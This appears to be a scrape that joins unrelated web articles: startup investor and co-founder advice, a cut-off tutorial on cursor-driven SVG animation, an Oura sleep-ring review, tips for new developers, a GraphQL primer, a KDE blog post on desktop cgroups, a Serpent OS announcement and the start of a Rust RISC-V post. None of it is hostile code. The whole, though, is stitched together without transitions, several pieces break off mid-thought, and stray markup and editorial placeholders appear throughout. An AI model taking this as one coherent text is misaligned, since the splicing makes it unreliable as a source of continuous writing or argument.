<p><span>When asked about what might kill a potential deal for her clients </span><a href="https://www.linkedin.com/in/marciasnelson/" target="_blank" rel="noopener noreferrer"><span>Marcia Nelson</span></a><span> Managing Director of </span><a href="https://www.alberleen.com/" target="_blank" rel="noopener noreferrer"><span>Alberleen Family Office Solutions</span></a><span> said on aspect is when a “startup’s management takes too long to get us requested information – while it may not kill a deal, it will certainly make us more cautious.” Investors want to know that you take your commitments seriously and that you are prepared to fulfil requests in a timely manner.&nbsp;</span></p>
<h4>5. Being Desperate</h4>
<p><span>Desperation can break a business partnership before it begins and shows investors that you are unconfident.&nbsp;</span></p>
<h4>6. Being Arrogant or Defensive<span>&nbsp;</span></h4>
<p><span>As I mentioned above confidence and arrogance are close neighbours and it’s important not to come off too strong.&nbsp;</span></p>
<h4>7. An Unwillingness to Listen</h4>
<p><span>Own your weaknesses. Investors will be put off if you act like you have all the answers and don’t need any help. You will need guidance and help on your journey and investors already know that. If you admit your faults and actively seek advice you will be left with a much healthier and more productive business relationship.&nbsp;</span></p>
<p><span>As a founder, it is </span><b>your responsibility</b><span> to make as easy as possible for investors to say yes to both you and your startup. You have to put yourself in the best position to form a great partnership that will be a lucrative deal for all parties involved. And the next step in that process is choosing your founding team,</span></p>
<h2><span>Choosing Your Co-Founders&nbsp;</span></h2>
<p><span>The founder who will lead the company isn’t necessarily the inventor. It is someone who believes in the startup’s idea and product. So much so that they are willing to put their future on the line to turn that idea into a successful company.</span></p>
<p><span>You should try and choose professionals that have the skills you lack. Someone who has a skillset to offer in another part of the business. Their skills should complement yours.&nbsp;</span></p>
<p><span>Another important factor is ensuring your values, expectations and business goals are aligned. You and your co-founders will become your startup’s core management team. It’s important to be on the same page when it comes to your startup’s mission, business goals, values and timeline.</span></p>
<p><span>You need to ask yourself if your personalities are compatible. </span><a href="https://techcrunch.com/2017/02/18/co-founder-conflict/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZm9yYmVzLmNvbS9zaXRlcy9reWxld29uZy8yMDE4LzA3LzI2L2hvdy10by1waWNrLXRoZS1yaWdodC1jb2ZvdW5kZXJzLWFuZC13aHktaXQtaW1wcm92ZXMteW91ci1jdXN0b21lci1leHBlcmllbmNlLw&amp;guce_referrer_sig=AQAAAEtIKZoxIkLDJGeNlqJVPCniIv_oDI2VMfIzQ8MoJFst1Y1LpVPlj_dgeGnWBxvuTx9vTEPU8-Lvvf4l34V7ZmlCoi71qW367ATIsBoEnNZ0Pybpbb0jkw9IphJ8mm-GJetR8PtNUn8-Pv5Rvdh2cXfZ_aO-Kk5hLP--l9aOGQXp" target="_blank" rel="noopener noreferrer"><span>Gary Tan</span></a><span>, Managing Partner at Initialized Capital and previously at YCombinator puts it perfectly:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*k0NpSqRY3Ufsv_kH" alt="Gary Tan: Co-founder disputes have historically been one of the top reasons startups fail" width="720" height="440" data-image-id="0*k0NpSqRY3Ufsv_kH" data-width="752" data-height="460"></figure>
<p><span>Will you be able to embrace the conflict with this person? Discussing disagreements on a level playing field to improve your business?&nbsp;</span></p>
<p><span>It comes down to one overarching question:</span></p>
<h4><b>Can you work together over a long period of time? </b></h4>
<p><span>After all, what good is it if their hard skills complement yours if you don’t actually like the person you have chosen as your cofounder?&nbsp;</span></p>
<p><span>Investors will take the dynamics of your relationship into account as they assess if your startup will be the right fit for their portfolio. As well as assessing your co-founder on the same essential qualities they judged you on.&nbsp;</span></p>
<p><span>I recommend that you thoroughly and carefully consider a business partner as you would a life partner. Ask yourself, if in the toughest times will that person remember that you are both on the same team and be by your side? More importantly, will they be an asset to your business.&nbsp;</span></p>
<p><span>Serial entrepreneur, </span><a href="https://twitter.com/amiller" target="_blank" rel="noopener noreferrer"><span>Andy Miller’s</span></a><span> formula is simple: </span><b>People</b><span> + </span><b>Execution </b><span>= </span><b>Success</b><span>. Your potential investors are counting on you and your startup management team to execute on your business plan, gain traction and, ultimately, bring in revenue no matter the hurdles.&nbsp;</span></p>
<p><span>Your founding team’s primary responsibility is to plan your journey to market that avoids potential roadblocks. Then, when unexpected roadblocks do inevitably appear, you and your founding team use that plan to navigate them.&nbsp;</span></p>
<p><span>As </span><a href="https://www.linkedin.com/in/seansheppard/" target="_blank" rel="noopener noreferrer"><span>Sean Sheppard</span></a><span> puts it:&nbsp;</span></p>
<h3><strong><span><i>“Most companies and innovations fail, and the reasons have to do with markets and the behaviours of the people who are running them, not the products themselves”.</i></span></strong></h3>
<p><span>You need to be able to trust and count on your co-founders. Choose correctly and you will have a strong foundation on which to move onto the next step: building a startup team.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>I'm so excited to have <em>finally</em> launched my website.</p><p>This was one of my favourite bits to make <strong>by far</strong>. A little animated me that responds to the cursor position.</p><p data-height="580" data-theme-id="dark" data-preview="true" data-default-tab="result" data-user="cassie-codes" data-slug-hash="WNQqZJG" data-pen-title="lil' me."><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/WNQqZJG">lil' me.</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>In this post we'll cover how to get values from the mouse movement and plug them into an animation.</p><p>This is my <strong>favourite</strong> thing about SVG animation. Not mouse movement in particular, but interactivity. Exporting animation as an mp4 is cool and all. But you can't <em>play</em> with it.</p><p>Animating on the web opens up so many cool possibilities!</p><p>If you're the kind of person who learns best by digging into the code, then just go ahead and fork that pen, have fun!</p><hr><p>Still here? 😊 Cool beans, let's go through it together.</p><p>I use <a href="https://greensock.com/">Greensock</a> for all my SVG animation. There are a few reasons for this. Firstly, it gives you more control and is super fun to use. But more importantly, as browsers implement the SVG spec differently, animating can get a bit messy. The team at Greensock put a lot of effort into harmonizing behavior across browsers.</p><p>Under the hood though, Greensock is just a really performant property manipulator. It will manipulate (pretty much) whatever value you want to change. In this case it's updating the values in a matrix transform. Check this out.</p><p><img src="https://www.cassie.codes/images/cursor.gif" alt="gif of matrix transforms updating with dev tools open" loading="lazy"></p><p>Cool right! Greensock is great at this kind of thing, but there's a lot going on in this pen, so let's break it down into chunks and focus on one bit at a time. First up, the mouse interaction. We'll come back to Greensock in a bit!</p><h2 id="heading-mouse-movement-fun!">Mouse movement fun!<a href="#heading-mouse-movement-fun!"><span role="text"> permalink</span></a></h2><p>So, there's another way we can modify values in CSS with Javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties!</a></p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="OJMOLML" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/OJMOLML">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>Let's walk through the process. The goal is to get the x and y position of the cursor as we move our mouse about, and then we can use those values to update some custom properties.</p><p>In the previous gif Greensock is using matrix transforms, which are more performant. But we're going to use <code>transform: translate(x,y)</code> for this as it's a tad more readable, and we can use percentage values.</p><p>First up, we declare some custom properties for the x and y values and then use those custom properties in place of regular property values in our transform.</p><pre><code><span><span>:root</span> <span>{</span></span><br><span>  <span>--mouse-x</span><span>:</span> 0<span>;</span></span><br><span>  <span>--mouse-y</span><span>:</span> 0<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>.pointer</span> <span>{</span></span><br><span>  <span>transform</span><span>:</span> <span>translate</span><span>(</span><span>var</span><span>(</span>--mouse-x<span>)</span><span>,</span> <span>var</span><span>(</span>--mouse-y<span>)</span><span>)</span><span>;</span></span><br><span><span>}</span></span></code></pre><p>Then we need to get our mouse coordinates. We can do this by listening to the mouse movement and getting the mouse's coordinates with <code>clientX</code> and <code>clientY</code></p><p>We'll assign those values to some global variables so that we can access them in another function later.</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> event<span>.</span>clientX<span>;</span></span><br><span>  yPosition <span>=</span> event<span>.</span>clientY<span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>Now we've got our coordinates, lets use them to update our custom properties and move our pointer around!</p><p>😇 When animating things on the web it's important to pay attention to performance. We can't know for sure how many times a users mouse event will fire as it's implementation specific. If it fires more than 60 times per second (which is the average refresh rate for most browsers) we'll end up with unnecessary computation. So to avoid burning up everyone's laptop fans and melting their CPU we can use <code>requestAnimationFrame</code></p><p>Request animation frame allows us to make smoother, browser optimized animations. If the user changes tabs, the animation will stop and give the CPU a break. You call the function once to start, and then it recusively calls itself.</p><p>⚠️ This is a great way to crash your browser if you get some code wrong!</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span>  <span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Right now, the x and y position we're getting back from <code>event.clientX</code> and <code>event.clientY</code> are pixel values, this isn't really useful to us.

<p>I have been using the <a href="https://ouraring.com/">Oura sleep tracking ring</a> for almost two years now. I immediately fell in love with the form factor, as I can’t stand watches or bracelets.</p>



<div><figure><a href="https://ouraring.com/"><img src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;ssl=1" alt="" width="256" height="156" srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" sizes="(max-width: 256px) 100vw, 256px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" data-lazy-src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<h2>When do I wear it?</h2>



<p>I used to wear it all the time, but then switched to night-only. I’m not interested in tracking my steps or any of the other activity features. </p>



<p>It also provides an interesting airport security case study: </p>



<p>Turns out that airport security doesn’t care about the Oura ring. Every time I try to put it off, they say “no no, keep the ring on”, and it never beeped or anything, even though it’s an electronic device.</p>



<h2>Main use cases?</h2>



<p>I mainly use it to observe my body temperature at night. It’s a great early warning system for infections.</p>



<p>Also for my “readiness”. It indicates how restful my night was, informing the intensity of my workouts. I‘ve especially found that “low readiness” combined with an “intense workout” is a really bad combination. Instead I use the earliest signs to „listen to my body“</p>



<p>Another important factor is seeing if I got enough REM sleep.</p>



<h2>What have I learned so far?</h2>



<p>I’ve learned that <a href="https://remo.org/2020/05/28/bedtime/" data-type="1791">time in bed doesn’t equal time asleep</a>. Just because you’ve been in bed for 7 hours doesn’t mean you slept for 7 hours. It’s more likely that you slept 6. Based on my ring, my own difference is 30 to 60 minutes per night.</p>



<p>I’ve also learned more about my sleep cycle. For the first few hours, my body focuses on deep sleep. Towards the morning, the focus is shifted to REM sleep. To feel fully rested, I both need enough deep as well as REM sleep. Especially the REM sleep seems to be the most important factor for me.</p>



<h2>Sick vs. Healthy</h2>



<p>Here is a comparison between me being sick and healthy. Your sleep quality is always summarized into a “readiness” score, which makes it easily comparable.</p>

<h2>How accurate is it?</h2>



<p>At the time I bought the ring, author of <a href="https://www.amazon.de/Why-We-Sleep-Science-Dreams/dp/0141983760/ref=sr_1_1?ie=UTF8&amp;qid=1534409176&amp;sr=8-1&amp;keywords=why+we+sleep&amp;tag=remouherek-21">Why We Sleep</a>, Matthew Walker, has said that this ring was probably the most accurate sleep tracking device for retail consumers. As I loved Matthew’s book, I trust his judgement.</p>



<h2>Hardware</h2>



<p>The battery lasts for 5-7 days, which is fine. The ring does introduce a new charging device to your life—but I guess we got used to charging device inflation, right?</p>



<p>I also like that the ring is waterproof, so you can wash your hands with it, or take a shower. </p>



<p>After 9 months, I had to have my ring replaced on warranty, because the battery life dropped to 1-2 days, and the whole process was very smooth. I never had any problems with my second ring.</p>



<h2>Software</h2>



<p>I love the mobile app. The ring connects via bluetooth and the syncing takes about 20 seconds. The ring receives regular firmware updates, which are also performed through the app.</p>



<h2>Conclusion</h2>



<p>If you care about your sleep and health, I highly recommend using the <a href="https://ouraring.com/">Oura ring</a>.</p>



<p>As a last comment, I strongly believe that the company should be acquired by Apple, as I believe that it would fit nicely into the Apple wearables ecosystem and provide a wonderful new form factor.</p>

						<!--kg-card-begin: markdown--><p>Yepp, more things I wish I'd known when I started, 4th edition.</p>
<p><em>You can find the first article in the series <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-to-program/">here</a>.</em></p>
<p><em>And the previous article <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-3/">here</a></em></p>
<h2 id="lovemaintenanceworkoratleastlearntoappreciateit">Love maintenance work or at least learn to appreciate it</h2>
<p>Very few things are more despised by programmers than doing maintenance work and working with legacy apps.</p>
<p>This can be counterproductive, as most of the work available involves doing exactly that. Companies have running systems, some built a long time ago, and someone needs to maintain that code. This is especially true if you are starting at an entry position, where you'll most likely work on some old application the company has been running for more than a decade.</p>
<p>We love working on new projects for several reasons:</p>
<ul>
<li>We can choose which technology to use.</li>
<li>We can flex our creatives muscles and create something cool.</li>
<li>There's a lot of freedom when designing the solution.</li>
<li>You get to work on The Next Big Thing and all the credit it carries.</li>
</ul>
<p>The huge difference between how we perceive maintenance work and new project development is a sad thing. On one hand, most of the really important job with high impact happens on those legacy systems, whereas The Next Big Thing often goes bust. On the other hand, that cool new app will be legacy as soon as it hits production and you start receiving new requirements.</p>
<p>We should start seeing maintenance work under a more positive light. After all, most of the value provided to end users happens on those systems. We could exercise our creative muscles by refactoring and improving the design, or increasing the test coverage, all proper challenges for developers of any level.</p>
<p>Learn to love maintenance work, it's most likely what you'll spend doing most of the time as a programmer.</p>
<h2 id="makeaccomplishmentsvisible">Make accomplishments visible</h2>
<p>You are an awesome developer, always finishing tasks on time, writing ultra-complete test suites and providing to customers exactly what they want. You do a great job every day and work extra hard to ship those last-minute features. Then, that time of the year when promotions are given arrives and you... you are still in the same position?</p>
<p>I know it can be extremely frustrating, and you might end up resenting management. After all, aren't you always doing an outstanding job? how dare they pass this chance to show me how much they appreciate my hard work!</p>
<p>In reality, managers are just too busy to keep track of your accomplishments. It's your responsibility to make your contribution visible to management.</p>
<p>It doesn't even require too much effort. Keep a list of the most important things you accomplish every week, and send small reports at the end of the week listing what you accomplished. You don't need to generate a fancy document: an email with bullet points will do.</p>
<p>It has two important advantages:</p>
<ul>
<li>Management doesn't need to pester you to get an idea of what you are doing at work.</li>
<li>You keep a registry of your accomplishments, which is useful for negotiating raises and other things.</li>
</ul>
<p>Take a proactive stance on the way management evaluates you, one of the biggest mistakes you can make is to outsource that responsibility to people who are already too busy with other things. Management will appreciate it, and so will you.</p>
<h2 id="fighttheimpostersyndrome">Fight the imposter syndrome</h2>
<p>Congratulations!</p>
<p>You got your first software development job. The idea of being interviewed made you feel very anxious, but you studied hard and aced the whole thing. Finally, you arrive at the office on your first day and...</p>
<p>And it's terrifying. Suddenly, you feel like a Jon Snow who knows nothing, and self-doubt starts to creep in. What if they find out I am not that smart? do I really deserve this job? am I a fraud? how long will it take them before they find out I'm a fraud and the horrible mistake they made by hiring me?</p>
<p>The following weeks don't help that much. Perhaps it's a technology you are not that familiar with, or maybe they ask you to work on some dark corner of their massive legacy application. Solving the tasks take you twice (or more) as long as the estimate, and you grow more and more anxious.</p>
<p>Been there, more than once.</p>
<p>It's all normal, the good old imposter syndrome. It's this feeling that you are fake, and that you don't deserve to be there. It will go away after a couple of weeks and you'll start to feel more confident. Ramp-up takes time, and in truth, no one really expects you to be 100% productive from the start. Your employer knows it will take some months before you know what you are doing, so don't punish yourself that hard.</p>
<p>Keep working hard, in no time you will become an important part of the team and your contributions will start to have an impact. We've all felt it, and I guarantee you it will go away. So keep up the good work!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>
<li><em>GraphQL Mutations</em> - mutations are used to write or post values.</li>
</ul>

  </a>
    </span></p>
<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>

    </span></p>
<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-240">
	
	<!-- .entry-header -->

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>

<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

          </p>
          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
